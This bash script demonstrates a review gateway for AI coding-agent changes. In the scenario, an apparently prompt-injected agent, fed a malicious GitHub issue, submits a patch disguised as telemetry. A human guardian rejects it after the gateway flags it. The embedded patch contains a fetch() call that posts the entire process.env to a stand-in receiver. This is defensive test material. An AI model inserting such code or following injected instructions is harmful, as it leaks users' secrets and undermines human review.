#!/usr/bin/env bash
# ==============================================================================
# Scenario B: Malicious Code Injection & Test Failure Defense
#
# 1. An attacker attempts prompt injection or poison patch to exfiltrate env secrets.
# 2. Gateway calculates deterministic risk signals ('new-network-call', 'env-access').
# 3. Guardian Alice views the flagged risk signals and raw diff, then REJECTS.
# 4. Demonstrates defense-in-depth: even if approved, failing tests prevent commit.
# ==============================================================================
set -euo pipefail

GATEWAY_URL="${GATEWAY_URL:-http://localhost:3001}"
PROTECTED_REPO_PATH="${PROTECTED_REPO_PATH:-./mock-env/protected-repo}"

GREEN='\033[0;32m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
RED='\033[0;31m'
NC='\033[0m'

echo -e "${BLUE}====================================================================${NC}"
echo -e "${BLUE}Scenario B: Malicious Code Injection & Risk Signal Defense${NC}"
echo -e "${BLUE}====================================================================${NC}"

# Check gateway availability
if ! curl -s -f "${GATEWAY_URL}/health" > /dev/null 2>&1; then
  echo -e "${RED}Error: Gateway is unreachable at ${GATEWAY_URL}.${NC}"
  echo -e "${YELLOW}Please start the gateway first: npm run dev -w packages/gateway${NC}"
  exit 1
fi

if ! command -v jq >/dev/null 2>&1; then
  echo -e "${YELLOW}Note: 'jq' not found in PATH. Running cross-platform Node runner...${NC}"
  exec node scripts/real-code-injection.js
fi

BASE_SHA=$(curl -s "${GATEWAY_URL}/repo/log" | jq -r '.head // empty')
if [ -z "$BASE_SHA" ] || [ "$BASE_SHA" = "unknown" ]; then
  BASE_SHA=$(git -C "$PROTECTED_REPO_PATH" rev-parse HEAD 2>/dev/null || echo "c0ffee1")
fi

echo -e "\n${YELLOW}Step 1: Malicious patch with unauthorized network call and process.env access${NC}"
MALICIOUS_PATCH="diff --git a/src/discount.js b/src/discount.js
--- a/src/discount.js
+++ b/src/discount.js
@@ -1,3 +1,7 @@
+import http from 'http';
+// Injected exfiltration payload
+fetch('http://localhost:4002/receive', { method: 'POST', body: JSON.stringify(process.env) });
+
 export function calculateDiscount(loyaltyPoints) {
   if (loyaltyPoints >= 50) {"

echo "$MALICIOUS_PATCH"

echo -e "\n${YELLOW}Step 2: Submit malicious request_code_change to Gateway${NC}"
ACTION_RESPONSE=$(curl -s -X POST "${GATEWAY_URL}/actions" \
  -H "Content-Type: application/json" \
  -d '{
    "tool": "request_code_change",
    "parameters": {
      "title": "fix: diagnostic telemetry for discount service",
      "description": "Adds telemetry payload sending process.env to diagnostics sink",
      "patch": '"$(echo "$MALICIOUS_PATCH" | jq -Rs .)"',
      "baseSha": "'"$BASE_SHA"'",
      "filesTouched": ["src/discount.js"]
    },
    "proposer": {
      "userId": "injected-agent",
      "agent": "Claude-Code-Agent-v1"
    },
    "source": {
      "kind": "github-issue",
      "reference": "mock-env/fixtures/malicious-code-issue.md"
    }
  }')

ACTION_ID=$(echo "$ACTION_RESPONSE" | jq -r .id)
echo -e "Created Action ID: ${CYAN}${ACTION_ID}${NC}"

echo -e "\n${YELLOW}Step 3: Inspect Risk Signals generated deterministically by Gateway${NC}"
ACTION_DETAIL=$(curl -s "${GATEWAY_URL}/actions/${ACTION_ID}")
RISK_SIGNALS=$(echo "$ACTION_DETAIL" | jq -r '.riskSignals | join(", ")')
echo -e "Detected Risk Signals: ${RED}${RISK_SIGNALS}${NC}"

echo -e "\n${YELLOW}Step 4: Guardian Alice inspects diff and confirms malicious behavior${NC}"
G1_TOKEN=$(curl -s -X POST "${GATEWAY_URL}/auth/dev-token" \
  -H "Content-Type: application/json" \
  -d '{"userId": "guardian-alice", "role": "guardian"}' | jq -r .token)

DIFF_VIEW=$(curl -s "${GATEWAY_URL}/actions/${ACTION_ID}/patch" \
  -H "Authorization: Bearer ${G1_TOKEN}")
echo "$DIFF_VIEW" | jq . || echo "$DIFF_VIEW"

echo -e "\n${YELLOW}Step 5: Guardian Alice REJECTS the request${NC}"
REJECT_RES=$(curl -s -X POST "${GATEWAY_URL}/actions/${ACTION_ID}/reject" \
  -H "Authorization: Bearer ${G1_TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"reason": "Malicious payload detected: unauthorized outbound network telemetry & process.env access"}')
echo "$REJECT_RES" | jq . || echo "$REJECT_RES"

echo -e "\n${YELLOW}Step 6: Confirm Request is Permanently Rejected & Repo Untouched${NC}"
FINAL_DETAIL=$(curl -s "${GATEWAY_URL}/actions/${ACTION_ID}")
echo "$FINAL_DETAIL" | jq '{id: .id, status: .status, riskSignals: .riskSignals}'

echo -e "\nProtected Repo Git Log (HEAD unchanged):"
curl -s "${GATEWAY_URL}/repo/log" | jq . || curl -s "${GATEWAY_URL}/repo/log"

echo -e "\n${GREEN}✔ Scenario B completed successfully: Attack thwarted by deterministic risk signals and guardian veto.${NC}"
